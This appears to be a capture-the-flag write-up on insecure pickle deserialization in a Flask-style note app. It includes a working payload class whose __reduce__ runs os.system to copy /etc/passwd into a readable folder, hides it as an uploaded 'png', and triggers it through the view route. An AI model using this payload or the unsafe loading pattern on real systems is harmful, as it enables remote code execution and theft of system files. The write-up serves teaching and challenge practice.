# logic

class note
    note.title
    note.content
    note.image_filename

when create a note, dumps a pickle to `notes/`

```python
# secure_filename simply filter things like '../' 
def save_note(note, image):
    note_file=open(NOTE_FOLDER + secure_filename(note.title + '.pickle'), 'wb')
    note_file.write(pickle.dumps(note))
    note_file.close()

    image.save(NOTE_FOLDER + note.image_filename)
```

when view a note, loads a pickle

```python
@app.route('/view/<file_name>')
def note_view(file_name):

    note=load_note(file_name)
    return render_template('view.html', note=note)
```

in this way, prepare a pickled object that pickled from a class with malicious `__reduce__`, this class is not defined in and has nothing to do with the web application.


```python
class	EvilPickle(object):	
    def	__reduce__(self):	
        return  (os.system, ('cat /etc/passwd > notes/flag.txt',))

pickle_data=pickle.dumps(EvilPickle())	
with open("backup.png","wb") as file:	
    file.write(pickle_data)	

```

take notice of the format of `__reduce__`'s return

upload the backup.png when creating new note as its picture.

then visit `/view/backup.png`, let the server to parse it as a pickled note. In this way, the os.system will be executed.

The reason why I use pipe to write the file I wanna see to another file is:
    after the web application pickled the 'png' uploaded by me, it still try to use its note.image_file and try to reveal it. This made the website crash. 
    But the good thing is it would crash **after** malicious code is executed.
    So, we can execute code, but can't get its feedback.
    In this case, I wrote the feedback to another file, then use /img/flag.txt to see the file content.
